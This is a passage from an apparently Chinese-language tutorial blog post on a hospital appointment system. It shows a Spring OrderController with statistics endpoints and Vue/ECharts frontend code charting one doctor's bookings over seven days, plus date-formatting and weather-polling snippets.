class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> OrderServiceImpl orderService;<br>    <span class="hljs-keyword">private</span> MedicalRecordServiceImpl medicalRecordService;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/countAge&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countAge()&#123;<br>        <span class="hljs-type">int</span>[] countAge=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">11</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>            countAge[i]=orderService.countAge(i*<span class="hljs-number">10</span>,(i+<span class="hljs-number">1</span>)*<span class="hljs-number">10</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> countAge;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/countDepartment&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countDepartment()&#123;<br>        <span class="hljs-type">int</span>[] count=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">12</span>];<br>        count[<span class="hljs-number">0</span>]=orderService.countDepartment(<span class="hljs-string">&quot;神经内科&quot;</span>);<br>        count[<span class="hljs-number">1</span>]=orderService.countDepartment(<span class="hljs-string">&quot;内科&quot;</span>);<br>        count[<span class="hljs-number">2</span>]=orderService.countDepartment(<span class="hljs-string">&quot;外科&quot;</span>);<br>        count[<span class="hljs-number">3</span>]=orderService.countDepartment(<span class="hljs-string">&quot;妇产科&quot;</span>);<br>        count[<span class="hljs-number">4</span>]=orderService.countDepartment(<span class="hljs-string">&quot;儿科&quot;</span>);<br>        count[<span class="hljs-number">5</span>]=orderService.countDepartment(<span class="hljs-string">&quot;眼科&quot;</span>);<br>        count[<span class="hljs-number">6</span>]=orderService.countDepartment(<span class="hljs-string">&quot;耳鼻咽喉科&quot;</span>);<br>        count[<span class="hljs-number">7</span>]=orderService.countDepartment(<span class="hljs-string">&quot;口腔科&quot;</span>);<br>        count[<span class="hljs-number">8</span>]=orderService.countDepartment(<span class="hljs-string">&quot;皮肤科&quot;</span>);<br>        count[<span class="hljs-number">9</span>]=orderService.countDepartment(<span class="hljs-string">&quot;肿瘤科&quot;</span>);<br>        count[<span class="hljs-number">10</span>]=orderService.countDepartment(<span class="hljs-string">&quot;中医科&quot;</span>);<br>        count[<span class="hljs-number">11</span>]=orderService.countDepartment(<span class="hljs-string">&quot;体检中心&quot;</span>);<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/countOrderByDoctorName&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrderByDoctorName(<span class="hljs-meta">@RequestParam</span> String name)&#123;<br>        <span class="hljs-keyword">return</span> orderService.countOrderByDoctorName(name);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/countOrder&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrder()&#123;<br>        <span class="hljs-keyword">return</span> orderService.countOrder();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;前端&#x3D;&#x3D;</p><p>前端是根据从后端拿到的数据绘图，写法参考<a href="https://echarts.apache.org/handbook/zh/get-started/">https://echarts.apache.org/handbook/zh/get-started/</a></p><p>我们的写法如下：</p><p>admin.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../utils/request&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getOrderCount</span> () &#123;<br>  <span class="hljs-keyword">return</span> request (&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/order/count&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span><br>  &#125;)<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getAgeCount</span> () &#123;<br>  <span class="hljs-keyword">return</span> request (&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/order/countAge&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span><br>  &#125;)<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">countOrder</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> request (&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/order/countOrder&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span>,<br>  &#125;)<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">countOrderByDoctorName</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/order/countOrderByDoctorName&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span>,<br>    <span class="hljs-attr">params</span>: &#123;<br>      <span class="hljs-attr">name</span>: name<br>    &#125;<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>给参数的写法很容易错，报错一般是xxx is not present</p><p>稍微总结：</p><p>1、传多个参数拿到的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;get&#x27;</span>,<br><span class="hljs-attr">params</span>: &#123;<br>    <span class="hljs-attr">val</span>:val,<br>    <span class="hljs-attr">current</span>: current<br>&#125;<br></code></pre></td></tr></table></figure><p>2、传一个表单</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<br>data <span class="hljs-comment">//或写为 params: data</span><br><span class="hljs-comment">// 后端需要多个参数时，前端可以作为表单提交</span><br><span class="hljs-comment">// 定义方式例：</span><br><span class="hljs-attr">page</span>: &#123;<br>    <span class="hljs-attr">current</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">size</span>: <span class="hljs-number">10</span><br>&#125;,<br></code></pre></td></tr></table></figure><p>3、不传参：直接不写</p></blockquote><p>接下来选择比较复杂的OrderEchartsByDoctor为例，效果是拿到从当天起及后六天共七天的单个医生的被预约数，然后展示，因为后端只拿到了数据数组，所以前端还写了获取近七天日期的方法与后端数据对应，另外这里本来想的是从父组件拿医生名，结果貌似子组件先加载所以拿不到，最后放弃了组件间传值，直接在这个子组件获取。</p><p>在components里新建OrderEchartsByDoctor.vue：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;div id=&quot;orderEchartsByDoctor&quot; :style=&quot;&#123;width: &#x27;400px&#x27;, height: &#x27;400px&#x27;&#125;&quot; class=&quot;chart&quot;&gt;&lt;/div&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;countOrder, getOrderCount&#125; from &#x27;@/api/admin&#x27;<br>import &#123;countOrderByDoctorName&#125; from &#x27;@/api/doctor&#x27;<br>import &#123;getCurrent&#125; from &#x27;@/api/login&#x27;<br><br>export default &#123;<br>  name: &#x27;OrderEchartsByDoctor&#x27;,<br>  props: [&#x27;name&#x27;],<br>  created()&#123;<br>    console.log(&quot;页面初次进来时，是否存在：&quot;, this.nameNow)<br>    this.getDate();<br>    this.countOrder();<br>  &#125;,<br>  data () &#123;<br>    return &#123;<br>      count: [],<br>      same_week: [],<br>      same_day: &#x27;&#x27;,<br>      singleDate: [],<br>      nameNow:&#x27;&#x27;<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    countOrder()&#123;<br>      getCurrent().then((res) =&gt; &#123;<br>        this.nameNow = res.username<br>        console.log(res)<br>        countOrderByDoctorName(this.nameNow).then((res) =&gt; &#123;<br>          this.count = res;<br>          this.drawLine()<br>        &#125;)<br>      &#125;)<br><br>    &#125;,<br><br>    getDate()&#123;<br>      // 默认显示当天前一周的数据<br>      let data = [];<br>      for (let i = 6; i &gt;= 0; i--) &#123;<br>        data.push(this.getDay(+i)) // 后<br>      &#125;<br>      console.log(data)<br>      // let date = data.reverse(); //得出一周的日期进行排序<br>      let date = data;<br>      let pkc = []; /* 用于存储展示的日期数据 */<br>      let weekday = [<br>        &#x27;星期日&#x27;,<br>        &#x27;星期一&#x27;,<br>        &#x27;星期二&#x27;,<br>        &#x27;星期三&#x27;,<br>        &#x27;星期四&#x27;,<br>        &#x27;星期五&#x27;,<br>        &#x27;星期六&#x27;,<br>      ];<br>      date.forEach((item, index) =&gt; &#123;<br>        //循坏日期<br>        let f = new Date(item);<br>        let week = f.getDay(); //计算出星期几<br>        let str1 = item.split(&#x27;-&#x27;);<br>        let strs = str1[0] + &#x27;-&#x27; + str1[1] + &#x27;-&#x27; + str1[2];<br><br>        let weeks = weekday[week]; /* 将计算出来的时间带入数字得出中文 */<br>        let time = Math.round(new Date(item) / 1000); //时间戳转换<br>        let s = &#123;&#125;; //用于存储每个日期对象<br>        s.date = item;<br>        s.name = strs;<br>        s.week = weeks;<br>        s.times = time;<br>        pkc.push(s);<br>      &#125;);<br>      this.same_week = pkc;<br>      //pkc存储着今天的年月日星期几，时间戳等<br>      this.same_day = pkc[0].date; //今天的数据<br>      for (let i = 0; i &lt; this.same_week.length; i++) &#123;<br>        this.singleDate = this.singleDate.concat(this.same_week[i].date)<br>      &#125;<br>    &#125;,<br>    getDay(day) &#123;<br>      let today = new Date();<br>      let targetday_milliseconds = today.getTime() + 1000 * 60 * 60 * 24 * day;<br>      today.setTime(targetday_milliseconds); //注意，这行是关键代码<br>      let tYear = today.getFullYear();<br>      let tMonth = today.getMonth();<br>      let tDate = today.getDate();<br>      tMonth = this.doHandleMonth(tMonth + 1);<br>      tDate = this.doHandleMonth(tDate);<br>      // return tYear + &#x27;-&#x27; + tMonth + &#x27;-&#x27; + tDate;<br>      return tMonth + &#x27;-&#x27; + tDate;<br>    &#125;,<br>    doHandleMonth(month) &#123;<br>      let m = month;<br>      if (month.toString().length == 1) &#123;<br>        m = month;<br>      &#125;<br>      return m;<br>    &#125;,<br><br>    drawLine()&#123;<br>      // 基于准备好的dom，初始化echarts实例<br>      let orderChart = this.$echarts.init(document.getElementById(&#x27;orderEchartsByDoctor&#x27;))<br>      // 绘制图表<br>      orderChart.setOption(&#123;<br>        title: &#123;<br>          text: &#x27;最近七天-我的预约&#x27;,<br>          subtext: &#x27;单位（个）&#x27;<br>        &#125;,<br>        tooltip: &#123;&#125;,<br>        yAxis: &#123;<br>          type: &#x27;category&#x27;,<br>          // data: [&quot;Mon&quot;,&quot;Tue&quot;,&quot;Wed&quot;,&quot;Thu&quot;,&quot;Fri&quot;,&quot;Sat&quot;,&quot;Sun&quot;]<br>          data: this.singleDate<br>        &#125;,<br>        xAxis: &#123;<br><br>        &#125;,<br>        series: [&#123;<br>          name: &#x27;挂号&#x27;,<br>          type: &#x27;bar&#x27;,<br>          color: &#x27;#86a185&#x27;,<br>          // data: [&quot;0&quot;,&quot;8&quot;,&quot;7&quot;,&quot;4&quot;,&quot;2&quot;,&quot;4&quot;,&quot;4&quot;]<br>          data: this.count.reverse()<br>        &#125;]<br>      &#125;);<br>    &#125;,<br>  &#125;<br>&#125;<br><br>&lt;/script&gt;<br><br>&lt;style&gt;<br>.chart&#123;<br>  margin-left: 100px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>然后在view&#x2F;doctor&#x2F;subdoctor&#x2F;AddPatient里使用组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>&lt;el-card&gt;<br>  &lt;order-echarts-by-doctor<br>    id=&quot;orderEchartsByDoctor&quot;<br>    :style=&quot;&#123;width: &#x27;400px&#x27;, height: &#x27;400px&#x27;&#125;&quot;<br>    :name=&quot;name&quot;<br>  &gt;&lt;/order-echarts-by-doctor&gt;<br>&lt;/el-card&gt;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import OrderEchartsByDoctor from &#x27;@/components/OrderEchartsByDoctor&#x27;<br>export default &#123;<br>  name: &#x27;addPatient&#x27;,<br>  components: &#123; OrderEchartsByDoctor &#125;,<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br>.demo-draw__content &#123;<br>  text-align: left;<br>&#125;<br>.button &#123;<br>  text-align: center;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>这里再把前端获取当前时间单拉出来：</p><p>法一：</p><p>使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;template&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;&#123; nowDate &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><p>定义：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">nowDate</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-comment">// 当前日期</span><br>    &#125;;<br>  &#125;,<br>  <span class="hljs-attr">methods</span>: &#123;<br>    <span class="hljs-title function_">currentTime</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-built_in">setInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">formatDate</span>, <span class="hljs-number">500</span>);<br>    &#125;,<br>    <span class="hljs-title function_">formatDate</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">let</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>      <span class="hljs-keyword">let</span> year = date.<span class="hljs-title function_">getFullYear</span>(); <span class="hljs-comment">// 年</span><br>      <span class="hljs-keyword">let</span> month = date.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span>; <span class="hljs-comment">// 月</span><br>      <span class="hljs-keyword">let</span> day = date.<span class="hljs-title function_">getDate</span>(); <span class="hljs-comment">// 日</span><br>      <span class="hljs-keyword">let</span> week = date.<span class="hljs-title function_">getDay</span>(); <span class="hljs-comment">// 星期</span><br>      <span class="hljs-keyword">let</span> weekArr = [ <span class="hljs-string">&quot;星期日&quot;</span>, <span class="hljs-string">&quot;星期一&quot;</span>, <span class="hljs-string">&quot;星期二&quot;</span>, <span class="hljs-string">&quot;星期三&quot;</span>, <span class="hljs-string">&quot;星期四&quot;</span>, <span class="hljs-string">&quot;星期五&quot;</span>, <span class="hljs-string">&quot;星期六&quot;</span> ];<br>      <span class="hljs-keyword">let</span> hour = date.<span class="hljs-title function_">getHours</span>(); <span class="hljs-comment">// 时</span><br>      hour = hour &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span> + hour : hour; <span class="hljs-comment">// 如果只有一位，则前面补零</span><br>      <span class="hljs-keyword">let</span> minute = date.<span class="hljs-title function_">getMinutes</span>(); <span class="hljs-comment">// 分</span><br>      minute = minute &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span> + minute : minute; <span class="hljs-comment">// 如果只有一位，则前面补零</span><br>      <span class="hljs-keyword">let</span> second = date.<span class="hljs-title function_">getSeconds</span>(); <span class="hljs-comment">// 秒</span><br>      second = second &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span> + second : second; <span class="hljs-comment">// 如果只有一位，则前面补零</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">nowDate</span> = <span class="hljs-string">`<span class="hljs-subst">$&#123;year&#125;</span>/<span class="hljs-subst">$&#123;month&#125;</span>/<span class="hljs-subst">$&#123;day&#125;</span> <span class="hljs-subst">$&#123;hour&#125;</span>:<span class="hljs-subst">$&#123;minute&#125;</span>:<span class="hljs-subst">$&#123;second&#125;</span> <span class="hljs-subst">$&#123;weekArr[week]&#125;</span>`</span>;<br>    &#125;<br>  &#125;,<br>  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">currentTime</span>();<br>  &#125;,<br>  <span class="hljs-comment">// 销毁定时器</span><br>  <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">formatDate</span>) &#123;<br>      <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">formatDate</span>); <span class="hljs-comment">// 在Vue实例销毁前，清除时间定时器</span><br>    &#125;<br>  &#125;<br>&#125;;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>法二：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>&#123;<br>    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;<br>      <span class="hljs-keyword">return</span>&#123;<br>        <span class="hljs-attr">date</span>:<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()<br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">methods</span>:&#123;<br>      <span class="hljs-title function_">dateFormat</span>(<span class="hljs-params">time</span>) &#123;<br>          <span class="hljs-keyword">var</span> date=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(time);<br>          <span class="hljs-keyword">var</span> year=date.<span class="hljs-title function_">getFullYear</span>();<br>          <span class="hljs-comment">/* 在日期格式中，月份是从0开始的，因此要加0</span><br><span class="hljs-comment">          * 使用三元表达式在小于10的前面加0，以达到格式统一  如 09:11:05</span><br><span class="hljs-comment">          * */</span><br>          <span class="hljs-keyword">var</span> month= date.<span class="hljs-title function_">getMonth</span>()+<span class="hljs-number">1</span>&lt;<span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span>+(date.<span class="hljs-title function_">getMonth</span>()+<span class="hljs-number">1</span>) : date.<span class="hljs-title function_">getMonth</span>()+<span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">var</span> day=date.<span class="hljs-title function_">getDate</span>()&lt;<span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span>+date.<span class="hljs-title function_">getDate</span>() : date.<span class="hljs-title function_">getDate</span>();<br>          <span class="hljs-keyword">var</span> hours=date.<span class="hljs-title function_">getHours</span>()&lt;<span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span>+date.<span class="hljs-title function_">getHours</span>() : date.<span class="hljs-title function_">getHours</span>();<br>          <span class="hljs-keyword">var</span> minutes=date.<span class="hljs-title function_">getMinutes</span>()&lt;<span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span>+date.<span class="hljs-title function_">getMinutes</span>() : date.<span class="hljs-title function_">getMinutes</span>();<br>          <span class="hljs-keyword">var</span> seconds=date.<span class="hljs-title function_">getSeconds</span>()&lt;<span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span>+date.<span class="hljs-title function_">getSeconds</span>() : date.<span class="hljs-title function_">getSeconds</span>();<br>          <span class="hljs-comment">// 拼接</span><br>          <span class="hljs-keyword">return</span> year+<span class="hljs-string">&quot;-&quot;</span>+month+<span class="hljs-string">&quot;-&quot;</span>+day+<span class="hljs-string">&quot; &quot;</span>+hours+<span class="hljs-string">&quot;:&quot;</span>+minutes+<span class="hljs-string">&quot;:&quot;</span>+seconds;<br>      &#125;<br>    &#125;,<br>    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-comment">//显示当前日期时间</span><br>          <span class="hljs-keyword">let</span> _this = <span class="hljs-variable language_">this</span><span class="hljs-comment">// 声明一个变量指向Vue实例this，保证作用域一致</span><br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>           _this.<span class="hljs-property">date</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">// 修改数据date</span><br>           &#125;, <span class="hljs-number">1000</span>)<br>       &#125;,<br>      <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>) &#123;<br>        <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>); <span class="hljs-comment">// 在Vue实例销毁前，清除我们的定时器</span><br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div&gt;&#123;&#123;<span class="hljs-title function_">dateFormat</span>(date)&#125;&#125;&lt;/div&gt;<br></code></pre></td></tr></table></figure><p><strong>天气</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getWeather</span>();<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getWeather</span>();<br>  &#125;, <span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)<br>&#125;,<br><span class="hljs-attr">methods</span>: &#123;<br>  <span class="hljs-title 